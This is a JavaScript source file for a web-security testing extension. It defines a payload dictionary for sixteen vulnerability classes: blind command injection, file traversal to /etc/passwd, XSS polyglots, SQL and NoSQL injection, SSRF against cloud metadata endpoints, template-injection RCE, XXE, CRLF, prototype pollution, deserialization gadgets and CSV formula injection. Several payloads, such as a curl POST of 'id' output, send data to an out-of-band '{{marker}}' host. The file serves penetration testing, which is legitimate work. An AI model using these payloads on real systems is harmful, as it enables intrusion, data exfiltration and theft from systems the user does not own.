// ============================================================================
// 🎯 BUG EXTENSION – THE COMPLETE FUZZING DICTIONARY SUITE
// Ultimate library for Web Security Testing, containing polyglots, multi-context
// bypasses, and edge-case testing strings for every major vulnerability class.
// Placeholder tokens: {{marker}} = OAST Hostname  |  {{my_email}} = Testing Email
// ============================================================================

var NucleiFuzzDictionaries = {
    // ── 1. BLIND OS COMMAND INJECTION (OAST & POLYGLOTS) ──
    cmdi: [
        "&nslookup {{marker}}&'\\\"`0&nslookup {{marker}}&`'",
        "1;nslookup${IFS}{{marker}};#${IFS}';nslookup${IFS}{{marker}};#${IFS}\";nslookup${IFS}{{marker}};#${IFS}",
        "$(ping -c 1 {{marker}} | nslookup {{marker}} ; wget {{marker}} -O /dev/null)",
        "|nslookup {{marker}}|curl {{marker}}",
        "||out=$(id);curl -X POST -d \"$out\" http://{{marker}}",
        ";printf 'hslo\\x75kup %s' {{marker}} | sh",
        "\nnslookup {{marker}}\n",
        "`nslookup {{marker}}`"
    ],

    // ── 2. PATH TRAVERSAL & LOCAL FILE INCLUSION (LFI) ──
    lfi: [
        "../../../../../../../../../etc/passwd",
        "../../../../../windows/win.ini",
        "/etc/passwd%00.jpg",
        "%252e%252e%252fetc%252fpasswd",
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "....//....//etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "file:///etc/passwd",
        "/WEB-INF/web.xml", // Java Web Apps
        "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
    ],

    // ── 3. CROSS-SITE SCRIPTING (XSS POLYGLOTS & WAF BYPASS) ──
    xss: [
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[/-javascript:alert(1)//]++'>",
        "<svg onload=alert(document.domain)>",
        "<img src=x onerror=alert(1)>",
        "\"><script>alert(1)</script>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<math><x href=\"javascript:alert(1)\">click",
        "javascript:alert`1`", // No parentheses bypass
        "<details open ontoggle=alert(1)>" // Modern event handler bypass
    ],

    // ── 4. RELATIONAL SQL INJECTION (SQLi) ──
    sqli: [
        "1' OR 1=1 -- -",
        "1\" OR 1=1 -- -",
        "' OR '1'='1",
        "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))A) AND '1'='1",
        "1\" AND (SELECT 1 FROM (SELECT(SLEEP(5)))A) AND \"1\"=\"1",
        "1' UNION SELECT NULL,NULL,CONCAT_WS(0x3a,0x41444d494e,version()),NULL -- -",
        "'; WAITFOR DELAY '0:0:5'--",
        "1 AND GTID_SUBSTR(VERSION(),1,1)=1",
        "1' OR json_type(id)=0 --", // JSON context SQLi
        "1) OR 1=1 --"
    ],

    // ── 5. NOSQL INJECTION (MongoDB / CouchDB) ──
    nosqli: [
        "{\"\\$gt\": \"\"}", // Key breakout
        "admin' || '1'=='1", // Standard JS evaluation breakout
        "{\"\\$ne\": null}", // Bypassing login credentials
        "'; return this.password.name !== null; var test = '",
        "{\"\\$regex\": \".*\"}",
        "1'||true||'"
    ],

    // ── 6. SERVER-SIDE REQUEST FORGERY (SSRF) & OAST ──
    ssrf: [
        "http://{{marker}}",
        "http://127.0.0.1:80",
        "http://localhost:80",
        "http://169.254.169.254/latest/meta-data/", // Cloud Metadata API
        "http://100.100.100.200/latest/meta-data/", // Alibaba Cloud Metadata API
        "http://[::]:80/",
        "http://0.0.0.0:80/",
        "http://127.1:80",
        "http://spoofed.burpcollaborator.net@{{marker}}/",
        "http://{{marker}}#@127.0.0.1" // Parser logic bypass
    ],

    // ── 7. SERVER-SIDE TEMPLATE INJECTION (SSTI) ──
    ssti: [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
        "{{this.constructor.constructor('alert(1)')()}}",
        "{{ self.__init__.__config__.__class__.__init__.__globals__['os'].popen('id').read() }}",
        "{{page.template.compile('T(java.lang.Runtime).getRuntime().exec(\"nslookup {{marker}}\")')()}}" // Java/Thymeleaf RCE
    ],

    // ── 8. XML EXTERNAL ENTITY (XXE) & XINCLUDE ──
    xxe: [
        '<!DOCTYPE xxe [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><x>&xxe;</x>',
        '<!DOCTYPE xxe [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]><x>&xxe;</x>',
        '<!DOCTYPE xxe [ <!ENTITY xxe SYSTEM "http://{{marker}}"> ]><x>&xxe;</x>',
        '<asd xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></asd>',
        '<!DOCTYPE xxe [ <!ENTITY % remote SYSTEM "http://{{marker}}/eval.dtd">%remote;%xml; ]>' // Blind Out-of-band XXE DTD
    ],

    // ── 9. OPEN REDIRECT / SSRF ──
    open_redirect: [
        "https://www.google.com",
        "//www.google.com",
        "/\\/www.google.com",
        "javascript:window.location='https://www.google.com'",
        "http://%1d%1fgoogle.com", // Control character redirection bypass
        "/%0d%0awww.google.com"
    ],

    // ── 10. CRLF INJECTION (HTTP RESPONSE SPLITTING) ──
    crlf: [
        "%0d%0aSet-Cookie:crlfinjection=crlfinjection",
        "%0d%0a%20Set-Cookie:crlfinjection=crlfinjection",
        "%252e%252e%252f%0d%0aSet-Cookie:crlfinjection=crlfinjection",
        "__proto__[crlf]=%0d%0aInjected-Header:True",
        "\r\nInjected-Header: value"
    ],

    // ── 11. PROTOTYPE POLLUTION ──
    prototype_pollution: [
        "__proto__[vulnerableProperty]=polluted",
        "constructor.prototype.vulnerableProperty=polluted",
        "__proto__.toString=1",
        "__proto__[clientSideOptions][layout]=<img src=x onerror=alert(1)>",
        "__proto__[sourceURL]=data:,alert(1)//" // Script injection gadget
    ],

    // ── 12. REMOTE CODE EXECUTION / DESERIALIZATION GADGETS ──
    rce_deserialization: [
        "O:8:\"stdClass\":1:{s:3:\"rce\";s:10:\"phpinfo();\";}", // Generic PHP serialized string
        "py/object:object\n", // Python PyYAML exploit initialization
        "!!com.sun.rowset.JdbcRowSetImpl { serializedData... }", // Java Fastjson/Jackson gadget
        "{\"__import__('os').system('nslookup {{marker}}')\"}" // Dynamic execution breakout
    ],

    // ── 13. IDOR / PREFERENCE FUZZING (INTEGER REPLACEMENTS) ──
    idor: [
        "0", "1", "01", "-1", "99999", "admin", "null", "undefined", "true", "false"
    ],

    // ── 14. INLINE SPECIAL PATHS / HIDDEN PARAMETERS GUESSING ──
    hidden_params: [
        "debug=true&test=1&admin=1&dev=true&show_hidden=true&enable=1",
        "exec=id&cmd=id&run=id&eval=id&system=id",
        "file=index.php&path=index.php&url=http://localhost&dest=http://localhost"
    ],

    // ── 15. CSV FORMULA INJECTION ──
    csv: [
        "=cmd|' /C nslookup {{marker}}'!'A1'",
        "+1+cmd|' /C calc'!A1",
        "-1+cmd|' /C calc'!A1",
        "=IMPORTXML(CONCAT(\"http://{{marker}}/\", A1), \"//a\")"
    ],

    // ── 16. BUSINESS LOGIC & HTTP PARAMETER POLLUTION (HPP) ──
    business_logic_hpp: [
        "price=0&amount=-1&quantity=0.01", // Negative/Fractional pricing parameter attacks
        "user_id=1&user_id=2", // HTTP Parameter Pollution (Testing duplication parsing behavior)
        "coupon=FREE&discount=100"
    ]
};